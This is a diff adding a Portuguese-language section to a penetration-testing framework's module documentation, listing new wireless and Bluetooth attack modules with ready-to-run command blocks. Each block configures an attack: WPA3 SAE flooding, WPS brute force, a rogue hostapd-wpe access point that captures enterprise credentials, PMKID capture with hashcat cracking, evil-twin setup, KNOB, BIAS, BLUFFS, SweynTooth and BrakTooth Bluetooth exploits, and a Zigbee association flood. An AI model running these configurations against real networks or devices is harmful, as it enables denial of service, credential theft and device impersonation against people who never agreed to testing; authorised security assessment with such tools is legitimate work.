@@ -294,4 +294,285 @@ run
 
 ---
 
+---
+
+## Novos na v1.2.0 — integrados da auditoria de submódulos
+
+### wpa3_sae_flood_native
+
+Flood nativo SAE commit via Scapy (DoS WPA3 / downgrade transition mode). Nenhum binário externo.
+
+```
+use generic/wifi_lab/wpa3_sae_flood_native
+set interface wlan0mon
+set target_bssid AA:BB:CC:DD:EE:FF
+set channel 6
+set frame_count 500        # 0 = contínuo até Ctrl+C
+set i_know_scope true
+run
+```
+
+---
+
+### wifi_security_analyzer
+
+Varredura passiva de Wi-Fi: analisa beacons/probe-responses, classifica cada BSS como
+WEP / WPA / WPA2-TKIP / WPA2-CCMP / WPA2-Enterprise / WPA3-SAE / WPA3-Transition / OWE / ABERTO.
+Detecta WPS, SSIDs ocultos e status de MFP. Nenhum binário externo.
+
+```
+use generic/wifi_lab/wifi_security_analyzer
+set interface wlan0mon
+set scan_time 30.0
+set channel 0              # 0 = hop automático de canal
+set i_know_scope true
+run
+```
+
+---
+
+### bully_bridge
+
+Brute-force WPS via bully (binário C, GPL-2.0). Alternativa ao reaver mais rápida em alguns APs.
+Pré-requisito: `apt install bully`.
+
+```
+use generic/external/bully_bridge
+set interface wlan0mon
+set target_bssid AA:BB:CC:DD:EE:FF
+set channel 6
+set pixie_dust false
+set i_know_scope true
+run
+```
+
+---
+
+### hostapd_wpe_bridge
+
+AP rogue WPE (Wireless Pwnage Edition) para captura de credenciais EAP/PEAP/MSCHAPv2.
+Pré-requisito: `apt install hostapd-wpe`.
+
+```
+use generic/external/hostapd_wpe_bridge
+set mode start
+set interface wlan0
+set ssid "RedeEmpresarial"
+set channel 6
+set i_know_scope true
+run
+
+# Exibir dicas de hashcat para os hashes capturados:
+set mode crack-hint
+run
+```
+
+---
+
+### hcxdumptool_live_bridge
+
+Captura ao vivo de PMKID + EAPOL via hcxdumptool. Separado do `hcx_toolchain_bridge`.
+Pré-requisito: `apt install hcxdumptool hcxtools`.
+
+```
+use generic/external/hcxdumptool_live_bridge
+set interface wlan0
+set timeout 60
+set convert_after true     # converte automaticamente para .hc22000
+set i_know_scope true
+run
+# Crack: hashcat -m 22000 .tmp/capture.pcapng.hc22000 wordlist.txt
+```
+
+---
+
+### sniffair_passive_recon
+
+Reconhecimento passivo Wi-Fi + captura automática EAP (SniffAir). Importação nativa ou subprocess.
+Pré-requisito: submodule SniffAir inicializado.
+
+```
+use generic/external/sniffair_passive_recon
+set mode info
+run
+
+set mode sniff
+set interface wlan0mon
+set timeout 60
+set i_know_scope true
+run
+```
+
+---
+
+### pwnagotchi_bridge
+
+Pwnagotchi: harvesting de handshakes WPA via IA. Status SSH, pull de PCAPs, hashcat pipeline.
+Pré-requisito: acesso SSH ao dispositivo (padrão: 10.0.0.2).
+
+```
+use generic/external/pwnagotchi_bridge
+set mode status
+set device_ip 10.0.0.2
+run
+
+set mode pull_handshakes
+set i_know_scope true
+run
+
+set mode crack
+set wordlist /path/to/rockyou.txt
+run
+```
+
+---
+
+### hashcatch_bridge
+
+Captura passiva WPA/WPA2 (sem transmissão). Compatível com aircrack-ng e hashcat.
+Pré-requisito: binário `hashcatch` no PATH ou compilado no submodule.
+
+```
+use generic/external/hashcatch_bridge
+set interface wlan0
+set timeout 120
+set i_know_scope true
+run
+```
+
+---
+
+### wirespy_bridge
+
+Automatização de modo monitor, hop de canal, descoberta de SSID e evil-twin via Bash.
+Pré-requisito: submodule wirespy inicializado.
+
+```
+use generic/external/wirespy_bridge
+set mode monitor
+set interface wlan0
+set i_know_scope true
+run
+```
+
+---
+
+### knob_attack_bridge
+
+KNOB — Força 1 byte de entropia na negociação de chave BT BR/EDR (CVE-2019-9506).
+
+```
+use generic/bluetooth/knob_attack_bridge
+set mode info
+run
+
+set mode poc
+set victim_a_mac AA:BB:CC:DD:EE:FF
+set forced_entropy 1
+set i_know_scope true
+run
+```
+
+---
+
+### bias_attack_bridge
+
+BIAS — Impersonação de dispositivo BT BR/EDR sem LTK (CVE-2020-10135).
+
+```
+use generic/bluetooth/bias_attack_bridge
+set mode info
+run
+
+set mode legacy_bypass
+set victim_mac AA:BB:CC:DD:EE:FF
+set i_know_scope true
+run
+```
+
+---
+
+### ble_bluffs_native
+
+BLUFFS — Downgrade de chave de sessão BLE, quebra sigilo futuro (CVE-2023-24023).
+
+```
+use generic/bluetooth/ble_bluffs_native
+set mode info
+run
+
+set mode poc
+set victim_mac AA:BB:CC:DD:EE:FF
+set attack_variant 1
+set i_know_scope true
+run
+```
+
+---
+
+### ble_sweyntooth_bridge
+
+SweynTooth 12+ vulnerabilidades de pilha BLE em SoCs TI, NXP, Dialog, Microchip, ST, Telink, Cypress.
+Pré-requisito: dongle nRF52 com firmware SweynTooth. Submodule inicializado.
+
+```
+use generic/bluetooth/ble_sweyntooth_bridge
+set mode list
+run
+
+set mode llid_deadlock
+set victim_mac AA:BB:CC:DD:EE:FF
+set dongle_port /dev/ttyACM0
+set i_know_scope true
+run
+```
+
+---
+
+### braktooth_bridge
+
+BrAcketooth 16+ ataques na pilha BT Classic (BR/EDR): deadlock, corrupção de memória, L2CAP.
+Alvos: Intel, Qualcomm, Jieli, Silicon Labs, Cypress, Espressif.
+
+```
+use generic/bluetooth/braktooth_bridge
+set mode list
+run
+
+set mode lmp_max_slot_overflow
+set victim_mac AA:BB:CC:DD:EE:FF
+set device_port /dev/ttyUSB1
+set i_know_scope true
+run
+```
+
+---
+
+### killerbee_zigbee_bridge
+
+Ataques Zigbee / IEEE 802.15.4 via KillerBee Python.
+Hardware necessário: RZUSB, APIMOTE, CC253x, TelosB, etc.
+Instalar: `pip install killerbee` ou inicializar submodule.
+
+```
+use generic/bluetooth/killerbee_zigbee_bridge
+set mode zbid
+run
+
+set mode zbdump
+set channel 15
+set output_file .tmp/zigbee_capture.pcap
+set i_know_scope true
+run
+
+set mode zbassocflood
+set channel 15
+set pan_id 0x1234
+set i_know_scope true
+run
+```
+
+---
+
 *Veja [docs/FULL_CATALOG.md](../FULL_CATALOG.md) para o índice completo de módulos gerado automaticamente.*
+*Veja [docs/INTEGRATION_AUDIT.md](../INTEGRATION_AUDIT.md) para a auditoria completa dos submódulos.*
